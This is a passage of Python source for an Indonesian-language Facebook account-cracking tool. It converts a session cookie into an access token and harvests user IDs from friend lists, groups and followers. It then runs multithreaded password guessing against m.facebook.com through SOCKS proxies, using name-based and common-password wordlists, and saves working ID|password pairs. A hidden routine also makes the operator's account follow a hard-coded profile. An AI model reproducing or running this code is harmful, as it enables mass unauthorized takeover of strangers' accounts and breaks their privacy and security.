|/   \__/(_______)(______/ |/     \|(_______/|/     \|(______/ 
[bold white]"""))

#----------[LICENSE]------------#
def license():
    try:
        open('key.txt','r').read()
        login()
    except IOError:
        try :
            os.system ('clear')
            banner()
            Console(width=80, style="bold cyan").print(Panel("""[bold white][1] Dapatkan Api key\n[2] Masukan Api Key\n[3] Keluar [Exit]""",subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (License) [bold green]<[bold yellow]<[bold red]<"))
            masuk = Console().input("[bold cyan]   ╰─> ")
            if masuk in ['1','01']:
                print (f"{H}[{P}!{H}]{P} Anda Akan Diarahkan Ke Whatsapp...")
                time .sleep (3 )
                os .system ('xdg-open https://wa.me/62895386194665?text=Bang+Minta+Lisensi')
                exit ()
            elif masuk in ['2','02']:
                RSAPubKey = "<RSAKeyValue><Modulus>uM/iEB7PK1QZpYrkC5NlrB/ENx5ZB5eouRGsIN35Co3gRCqzq/yd8Iqr9WfYXW5jiWg65+xjjdSHXq6VhJ6m2/4VxHRLTH8/52V5MJ9lzOnQDV1Vi6fJVgDyc9LiuerghiiAgxTt92ZOFl54WzsC43kMHXkHbkSJOXnyoNfyS2sGyE2rtjIqJJk3vYJjNtRYsXLPvsYH06Y76qFVXOzlBam4Yn578tFtrkiC1DRKD4lOj3ofOjslDIEWASxkxA8gjBd+cfKcDdUpnSmgXgOhag2o09Sslh/DYSBkvA7zECv4MzaVD7RtjeyzTurNz8UKD0Q0SYWMNRIVf7Dr5YYzDw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
                auth = "WyI1ODU1MjYyMyIsIk1iNnBPaEFUazRUQ245bmFJQ1ZKYkRLNVV2OXNlUG5OUTFYQVpyQ08iXQ=="
                Console(width=80, style="bold cyan").print(Panel("""Masukan licensi mu""",subtitle="╭───", subtitle_align="left"))
                key = str(input("[bold cyan]   ╰─>  "))
                result = Key.activate(token=auth,\
                    rsa_pub_key=RSAPubKey,\
                    product_id=21585, \
                    key=key,\
                    machine_code=Helpers.GetMachineCode())
                if result[0] == None or not Helpers.IsOnRightMachine(result[0]):
                    print (f"{H}[{P}*{H}]{P} Expired :{K} {result['expires'].split('T')[0]}")
                    print("The license does not work: {0}".format(result[1]))
                else:
                    print("The license is valid!")
                    open('key.txt','w').write(key)
                    time .sleep (2 )
                    login()
            elif masuk in ['3','03']:
                exit ()
            else :
                exit (f"[!] Wrong Input")
        except (KeyError ):
            exit (f"[!] Api Key Invalid")
        except Exception as masuk :
            exit (f"[!] {masuk}")
    
#--------------------[ BAGIAN-MASUK ]--------------#
def login123():
	os.system('clear')
	banner()
	Console(width=80, style="bold cyan").print(Panel("""[bold white][[bold cyan]01[bold white]] Login Menggunakan Cookie\n[[bold cyan]02[bold white]] Keluar
    """,subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (LOGIN) [bold green]<[bold yellow]<[bold red]<"))
	bryn = Console().input("[bold cyan]   ╰─> ")
	if bryn in ['1','01']:
		login_lagi334()
	elif bryn in ['2','02']:
		exit()
	else:
		Console().print("[bold cyan]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r')
		time.sleep(5)
		login()
		
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login123()
		except requests.exceptions.ConnectionError:
			Console().print("[bold cyan]   ╰─>[bold red] Problem Internet Connection, Check And Try Again")
			exit()
	except IOError:
		login123()
		
def login_lagi334():
	try:
		Console(width=80, style="bold cyan").print(Panel("""Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account""",subtitle="╭───", subtitle_align="left", title="[bold green]>[hot_pink2] (SARAN) [bold green]<"))
		your_cookies = Console().input("[bold cyan]   ╰─> ")
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(" [+] Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							Console(width=80, style="bold cyan").print(Panel(f"""[bold cyan][+] Token : [bold green]{access_token}""", title="[bold green]>[hot_pink2] (PILIHAN) [bold green]<"))
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							Console().print("[bold cyan]   ╰─> [bold green]Login Berhasil,Sedang Menjalankan Ulang[bold white]");time.sleep(5)
							os.system('python run.py')
							followdong()
			except Exception as e:
				Console().print(f"[bold cyan]   ╰─>[bold red] Cookies Mokad Bang")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				exit()
	except:pass

def followdong():
	try:
		token = open('.token.txt','r').read()
		cokies = open('.cok.txt','r').read()
	except IOError:
		Console().print("[bold cyan]   ╰─>[bold red] Cookies Kadaluarsa ")
		time.sleep(5)
		login()
	myuid = ('100001571125775')
	try:
		for foll in parser(requests.get(f'https://mbasic.facebook.com/'+myuid,cookies={'cookie':cokies}).text,'html.parser').find_all('a',href=True):
			if '/a/subscribe.php?' in foll.get('href'):
				x=requests.get('https://mbasic.facebook.com'+foll['href'],cookies = {'cookie':cokies}).text
				exit()
	except(Exception)as e:print(e)#< Response error
	
#----------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		Console().print("[bold cyan]   ╰─>[bold red] Cookies Kadaluarsa ")
		time.sleep(3)
		login()
	os.system('clear')
	banner()
	negara = requests.get("http://ip-api.com/json/").json()["country"]
	ip = requests.get("http://ip-api.com/json/").json()["query"]
	kota = requests.get("http://ip-api.com/json/").json()["city"]
	region = requests.get("http://ip-api.com/json/").json()["region"]
	times = requests.get("http://ip-api.com/json/").json()["timezone"]
	day = datetime.now().strftime("%d-%b-%Y")
	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white]Tanggal  : [bold green]{day}[/][/]\n[bold white][+[/][bold white]][/] [bold white]License  : [bold green]****-****-[/][/]\n[bold white][+[/][bold white]][/] [bold white]Versi Sc : [bold green]Update 2.1[/][/] ',width=40,padding=(0,3),style=f"bold cyan"))
	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Country  : [bold green]{negara}[/]\n[bold white][+[/][bold white]][/] [bold white]City     : [bold green]{kota}[/]\n[bold white][+[/][bold white]][/] [bold white]Region   : [bold green]{region}[/][/]\n[bold white][+[/][bold white]][/] [bold white]TimeZone : [bold green]{times}[/][/]\n[bold white][+[/][bold white]][/] [bold white]My Ip    : [bold green]{ip}[/][/] ',width=40,padding=(0,3),style=f"bold cyan"))
	console.print(Columns(dia))
	Console(width=80, style="bold cyan").print(Panel(f"""[bold green][01] Crack dari teman		[03] Crack dari Group		[05] Results\n[02] Crack Massal		[04] Cek hasil Cp		[06] [bold red]Logout""",subtitle="╭───", subtitle_align="left", title="[bold green]>[hot_pink2] (PILIHAN) [bold green]<"))
	HaHi = Console().input(f"[bold cyan]   ╰─> ")
	if HaHi in ['1','01']:
		publik()
	elif HaHi in ['2','02']:
		massal()
	elif HaHi in ['3','03']:
		crack_group()
	elif HaHi in ['4','04']:
		file_cp()
	elif HaHi in ['5','05']:
		result()
	elif HaHi in ['6','06']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		Console().print(f"[bold cyan]   ╰─>[bold red] Sukses Logout+Hapus Cookies")
		time.sleep(5)
		login()
	else:
		Console().print("[bold cyan]   ╰─>[bold red] Pilih Yang Bener Bang ")
		exit()

#-----------------[ CRACK GRUP ]-----------------# 
def crack_group():
	try:
		token = open('.token.txt','r').read()
		cokies = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	cetak(nel(' Pastikan Idz Grup Bersifat Publik , Mohon Bersabar Dump Id Grup Sangat Lambat',width=90,style=f"bold white"))
	url = input(f' [+] Id Group : ')
	kocak("https://mbasic.facebook.com/groups/"+url,cokies)
	print("\r")
	setting()

def kocak(url,cokies):
	data = parser(ses.get(url,cookies={"cookie": cokies}).text, "html.parser")
	judul = re.findall("<title>(.*?)</title>",str(data))[0]
	if str(judul) == 'Use basic mode':
		print('\n [+] Cokies Berada Dalam Mode Free');exit()
	if str(judul) == 'Epsilon':
		print('\n [+] Cokies Tidak Dpt Mengakses Grup');exit()
	if str(judul) == 'Kesalahan':
		print('\n [+] Cokies Yg Anda Masukan Salah');exit()
	if str(judul) == 'Masuk Facebook' or str(judul) == 'Masuk Facebook | Facebook' or str(judul) == 'Masuk ke Facebook' or str(judul) == 'Log in to Facebook':
		print('\n [+] Cokies Mokad');exit()
	else:
		for isi in data.find_all("h3"):
			for ids in isi.find_all("a",href=True):
				if "profile.php" in ids.get("href"):uid = ids.get("href").split("=")[1].replace("&eav","");nama = ids.text
				else:
					if ids.text==judul:pass
					else:uid = ids.get("href").split("/")[1].split("?")[0];nama = ids.text
				if uid+"|"+nama in id:pass
				else:id.append(uid+"|"+nama)
				print('\r [+] Mengumpulkan %s Id'%(len(id)),end='')
		for x in data.find_all("a",href=True):
			if "Lihat Postingan Lainnya" in x.text:
				kocak("https://mbasic.facebook.com"+x.get("href"),cokies)
			
###----------[ DUMP PENGIKUT ]---------- ###
def pengikut():
	try:
		token = open('.token.txt','r').read()
		cookie = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	ses = requests.Session()
	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=80,padding=(0,7),style=f"bold white"))
	user = input(f" [+] Masukan Id : ")
	if user.isdigit():
		url = (f"https://mbasic.facebook.com/profile.php?id={user}&v=followers")
	else:
		url = (f"https://mbasic.facebook.com/{user}?v=followers")
	try:
		link = ses.get(url, cookies={"cookie": cookie}).text
		if "Halaman Tidak Ditemukan" in link:
			print("\n [+] Pengguna Dengan User Id {user} Tidak Ditemukan")
			time.sleep(2);exit()
		elif "Anda Diblokir Sementara" in link:
			print("\n [+] Akun Anda Di Batasin Sementara")
			time.sleep(2);exit()
		elif "Konten Tidak Ditemukan" in link:
			print("\n [+] Pengguna Dengan User Id {user} Tidak Ditemukan")
			time.sleep(2);exit()
		else:
			dump_followers(url, cookie)
	except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout) as e:
		print(" [+] Tidak Ada Koneksi Internet, Periksa Kembali Koneksi Anda")
		time.sleep(3);exit()
	print("\r")
	setting()


def dump_followers(link, cookie):
	try:
		url = ses.get(link, cookies={"cookie": cookie}).text
		data = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>', str(url))
		for user in data:
			if "profile.php?" in user[0]:
				id.append(re.findall("id=(.*?)&amp;eav", user[0])[0]+'|'+user[1])
			else:
				id.append(re.findall("(.*?)\?eav", user[0])[0]+'|'+user[1])
			Console().print(f" [+] Sedang Mengumpulkan {str(len(id))} Id...", end='\r')
			time.sleep(000000.003)
		if "Lihat Selengkapnya" in url:
			dump_followers("https://mbasic.facebook.com"+parser(url, "html.parser").find("a", string="Lihat Selengkapnya").get("href"), cookie)
	except:pass
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	Console().print(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Lihat Hasil OK[/]           [bold white][[bold cyan]02[/][bold white]][/] [bold white]Lihat Hasil CP[/]',width=90,padding=(0,11),title=f"[bold white][/][bold green]List Menu Cek[/][bold white][/]",style=f"bold white"))
	kz = input(f' [+] Pilih : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' [+] File Tidak Di Temukan ')
			time.sleep(3)
			exit()
		if len(vin)==0:
			print(' [+] Anda Tidak Memiliki Hasil CP ')
			time.sleep(4)
			exit()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'\n{P}{x}{H} [+] {x}{P}{x} {P}Select{x} : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' [+] Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' [+] File Tidak Di Temukan ')
				time.sleep(4)
				exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			exit()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' [+] File Tidak Di Temukan ')
			time.sleep(4)
			exit()
		if len(vin)==0:
			print(' [+] Anda Tidak Mempunyai File OK ')
			time.sleep(4)
			exit()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n [+] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' [+] Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(' [+] File Tidak Di Temukan ')
				time.sleep(4)
				exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}User-Agent : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			exit()
	else:
		print(' [+] Pilih Yang Bener Kontol ')
		exit()
	
#-------------------[ CRACK-PUBLIK-MASSAL]----------------#
def publik():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cok.txt','r').read()
	except IOError:
		exit()
	Console(width=80, style="bold cyan").print(Panel("""\t[bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri""",subtitle="╭───", subtitle_align="left"))
	pil = Console().input("[bold cyan]   ╰─> ")
	try:
		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
		for pi in koH['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		Console().print(f'[bold cyan]   ╰─>[bold green]  Total ID Yang Terkumpul : [bold green]'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		Console().print("[bold cyan]   ╰─>[bold red]  Internet Lu Gak Ada Anjing")
		exit()
	except (KeyError,IOError):
		Console().print("[bold cyan]   ╰─>[bold red] Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk")
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		Console(width=80, style="bold cyan").print(Panel('\t[bold yellow] Mau Berapa Target Yang Mau Di Crack',subtitle="╭───", subtitle_align="left", title="[bold green]>[hot_pink2] (Crack Masal) [bold green]<"))
		jum = int(input(f"{O}   ╰─> "))
	except ValueError:
		print(' [+] Wrong input ')
		exit()
	if jum<1 or jum>80:
		Console().print("[bold cyan]   ╰─>[bold red] Pertemanan Tidak Publik  ")
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		Console(width=80,style="bold cyan").print(panel('\t[bold yellow] Masukkan Target ke '+str(yz)+'',subtitle="╭───", subtitle_align="left"))
		kl = Console().input(f'[bold cyan]   ╰─> ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' [+] Unstable Signal ')
			exit()
	try:
		Console(width=80,style="bold cyan").print(panel("""[bold yellow] Total Id Target Yang Terkumpul""",subtitle="╭───", subtitle_align="left"))
		Console().print('[bold cyan]   ╰─> [bold green]'+str(len(id)))					  
		setting()
	except requests.exceptions.ConnectionError:
		print(f'')
		print(' [+] Unstable Signal ')
		exit()
	except (KeyError,IOError):
		print(f' [+] Pertemanan Tidak Public ')
		time.sleep(3)
		exit()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
    Console(width=80, style="bold cyan").print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Crack akun Old [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Crack Akun New [/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Crack Akun Random [[bold green]Recommended[bold white]][/]',subtitle="╭───", subtitle_align="left", title="[bold green]>[hot_pink2] (PILIH) [bold green]<"))
    hu = Console().input(f"[bold cyan]   ╰─> ")
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        print(' [+] Pilih Yang Bener Sayang ')
        exit()
    Console(width=80, style="bold cyan").print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Login Site [bold green]reguler.facebook.com[bold white] [/]',subtitle="╭───", subtitle_align="left", title="[bold green]>[hot_pink2] (Method) [bold green]<"))
    hc = Console().input(f"[bold cyan]   ╰─> ")
    if hc in ['1','01']:
        method.append('validate1')
    elif hc in ['2','02']:
        method.append('validate2')
    elif hc in ['3','03']:
        method.append('reguler1')
    else:
        method.append('validate1')
    Console(width=80, style="bold cyan").print(Panel('''[bold white][[bold cyan]01[bold white]] [bold white]Password ke-1
[bold white][[bold cyan]02[bold white]] [bold white]Password ke-2
[bold white][[bold cyan]03[bold white]] [bold white]Password Manual [[bold red]Not Recommended[bold white]]''',subtitle="╭───", subtitle_align="left", title="[bold green]>[hot yellow] (Password) [bold green]<"))
    pwplus=Console().input(f"[bold cyan]   ╰─> ")
    if pwplus in ['03','3']:
        pwpluss.append('ya')
        pwku=Console().input(f"[bold cyan]   ╰─> ")
        pwkuh=pwku.split(',')
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append('no')
    Console(width=80, style="bold cyan").print(Panel(f'[bold yellow]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',subtitle="╭───", subtitle_align="left",title=f"[bold green]Setting Cek Apk"))
    joki = Console().input(f"[bold cyan]   ╰─> ")
    if joki in ['']:
        print(' [+] Pilih Yang Bener Kontol ')
        exit()
    elif joki in ['y','Y']:
        taplikasi.append('ya')
    else:
        taplikasi.append('no')
    Console(width=80, style="bold cyan").print(Panel(f'[bold yellow]Apakah Anda Ingin Menampilkan Opsi Checkpoint Di Dalam Akun ? Y/T',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi"))
    joki = Console().input(f"[bold cyan]   ╰─> ")
    if joki in ['']:
        print(' [+] Pilih Yang Bener Kontol ')
        exit()
    elif joki in ['y','Y']:
        gabriel.append('ya')
    else:
        gabriel.append('no')
    Console(width=80, style="bold cyan").print(Panel(f'[bold yellow]Apakah Anda Ingin Mengunakan UA Manual Untuk Melakukan Crack Account ? Y/T',subtitle="╭───", subtitle_align="left",title=f"[bold green]Setting User-Agent"))
    uatambah = Console().input(f"[bold cyan]   ╰─> ")
    if uatambah in ['y','Ya','ya','Y']:
        ualuh.append('ya')
        bzer = Console().input(f"[bold cyan]   ╰─> ")
        ualu.append(bzer)
    else:
        ualuh.append('tidak')
    passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	print('')
	urut = []
	urut.append(panel(f'        [bold green]%s [bold white]'%(okc),width=40,title=f"[bold green]OK SAVE",style=f"bold cyan"))
	urut.append(panel(f'         [bold red]%s [bold white]'%(cpc),width=40,title=f"[bold red]CP SAVE",style=f"bold cyan"))
	wa.print(Columns(urut))
	Console(width=80, style="bold cyan").print(Panel(f'\t[bold yellow]hidup/matikan Mode Pesawat Setiap 5 menit',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold cyan"))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(" ")[0]
				pwv = ['anjing','tegalgading','sayang','sayangku','sayang123','bismillah','katasandi','sandi123','malang','bismillah123','123455']
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'1')
						pwv.append(frs+'2')
						pwv.append(frs+'3')
						pwv.append(frs+'00')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
						pwv.append(frs+'12')
						pwv.append(frs+'321')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'12')
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'1234567')
						pwv.append(frs+'12345678')
						pwv.append(frs+'123456789')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'validate1' in method:
					pool.submit(validate1,idf,pwv)
				elif 'validate2' in method:
					pool.submit(validate2,idf,pwv)
				elif 'reguler1' in method:
					pool.submit(reguler1,idf,pwv)
				else:
					pool.submit(validate1,idf,pwv)
		print('')
	Console(width=80, style="bold cyan").print(Panel(f'Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi"))
	Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
	Console(width=80, style="bold cyan").print(Panel(' Lanjut Crack Kembali ?  Y/T  ',subtitle="╭───", subtitle_align="left"))
	li = Console().input(f"[bold cyan]   ╰─> ")
	if li in ['Y','y']:
		license()
	else:
		Console().print(f"[bold cyan]   ╰─> God Bye Kawan")
		time.sleep(2)
		exit()

#--------------------[ METODE VALIDATE ]-----------------#
def validate1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]CRACK[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%25